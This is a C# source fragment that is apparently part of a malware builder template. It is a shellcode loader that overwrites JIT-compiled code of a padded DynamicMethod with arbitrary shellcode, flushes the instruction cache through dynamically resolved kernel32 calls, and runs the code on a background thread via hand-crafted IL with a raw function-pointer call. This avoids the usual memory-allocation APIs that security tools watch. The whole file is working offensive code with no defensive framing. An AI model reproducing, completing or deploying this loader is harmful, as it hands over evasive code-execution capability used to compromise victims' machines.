    internal static class Exec
    {
        static long[] JunkPad = new long[4096];

        static void InitPad()
        {
            for (int i = 0; i < JunkPad.Length; i++)
                JunkPad[i] = (long)((long)i * unchecked((long)0x9E3779B97F4A7C15));
        }

        static IntPtr BuildSinkDM(int minNativeSize, out int estNativeSize)
        {
            int perIter = 20;
            int iters = (minNativeSize / perIter) + 512;
            estNativeSize = iters * perIter;

            DynamicMethod dm = new DynamicMethod("s", typeof(long),
                new Type[] { typeof(long) }, typeof(object).Module, true);
            ILGenerator il = dm.GetILGenerator();

            FieldInfo junkFld = typeof(Exec).GetField("JunkPad",
                BindingFlags.Static | BindingFlags.NonPublic);

            for (int i = 0; i < iters; i++)
            {
                il.Emit(OpCodes.Ldsfld, junkFld);
                il.Emit(OpCodes.Ldc_I4, i & 0xFFF);
                il.Emit(OpCodes.Ldelem_I8);
                il.Emit(OpCodes.Ldarg_0);
                il.Emit(OpCodes.Xor);
                il.Emit(OpCodes.Starg_S, (byte)0);
            }
            il.Emit(OpCodes.Ldarg_0);
            il.Emit(OpCodes.Ret);

            Func<long, long> d = (Func<long, long>)dm.CreateDelegate(typeof(Func<long, long>));
            d(0x1234567890ABCDEF);

            MethodInfo getMD = dm.GetType().GetMethod("GetMethodDescriptor",
                BindingFlags.NonPublic | BindingFlags.Instance);
            object rmhBoxed = getMD.Invoke(dm, null);
            RuntimeMethodHandle rmh = (RuntimeMethodHandle)rmhBoxed;
            return rmh.GetFunctionPointer();
        }

        static Action BuildTrapDM(IntPtr shellcodeFP)
        {
            DynamicMethod dm = new DynamicMethod("t", typeof(void),
                new Type[0], typeof(object).Module, true);
            DynamicILInfo info = dm.GetDynamicILInfo();

            ConstructorInfo ctor = typeof(Exception).GetConstructor(new Type[0]);
            int tokCtor = info.GetTokenFor(ctor.MethodHandle);

            byte[] sig = new byte[] { 0x02, 0x00, 0x01 };
            int tokSig = info.GetTokenFor(sig);

            int tokException = info.GetTokenFor(typeof(Exception).TypeHandle);

            byte[] il = new byte[25];
            il[0] = 0x73;
            Array.Copy(BitConverter.GetBytes(tokCtor), 0, il, 1, 4);
            il[5] = 0x7A;
            il[6] = 0x26;
            il[7] = 0x21;
            Array.Copy(BitConverter.GetBytes(shellcodeFP.ToInt64()), 0, il, 8, 8);
            il[16] = 0xD3;
            il[17] = 0x29;
            Array.Copy(BitConverter.GetBytes(tokSig), 0, il, 18, 4);
            il[22] = 0xDE; il[23] = 0x00;
            il[24] = 0x2A;

            info.SetCode(il, 8);
            info.SetLocalSignature(new byte[] { 0x07, 0x00 });

            byte[] eh = new byte[28];
            eh[0] = 0x41; eh[1] = 28;
            Array.Copy(BitConverter.GetBytes((uint)0x0000), 0, eh, 4, 4);
            Array.Copy(BitConverter.GetBytes((uint)0), 0, eh, 8, 4);
            Array.Copy(BitConverter.GetBytes((uint)6), 0, eh, 12, 4);
            Array.Copy(BitConverter.GetBytes((uint)6), 0, eh, 16, 4);
            Array.Copy(BitConverter.GetBytes((uint)18), 0, eh, 20, 4);
            Array.Copy(BitConverter.GetBytes(tokException), 0, eh, 24, 4);
            info.SetExceptions(eh);

            return (Action)dm.CreateDelegate(typeof(Action));
        }

        [System.Runtime.ExceptionServices.HandleProcessCorruptedStateExceptions]
        [System.Security.SecurityCritical]
        static void FireTrap(IntPtr shellcodeFP)
        {
            try
            {
DBG_TRAP_PH
                Action trap = BuildTrapDM(shellcodeFP);
                trap.Invoke();
            }
            catch { }
        }

        internal static void Run(byte[] shellcode)
        {
            GC.Collect();
            InitPad();
DBG_INIT_PH

            int nativeSize = 0;
            int padded = shellcode.Length + 0x2000;
            IntPtr sinkFP = BuildSinkDM(padded, out nativeSize);
DBG_SINK_PH

            Marshal.Copy(shellcode, 0, sinkFP, shellcode.Length);
DBG_COPIED_PH

            var flush = Resolver.GetDelegate<FlushInstructionCacheD>(K32_PH, FLUSHICACHE_PH);
            if (flush != null)
                flush(new IntPtr(-1), sinkFP, (UIntPtr)shellcode.Length);
DBG_FLUSHED_PH

            Thread t = new Thread(() => FireTrap(sinkFP));
            t.IsBackground = true;
            t.Start();
DBG_THREAD_PH

            while (true) Thread.Sleep(60000);
        }
    }
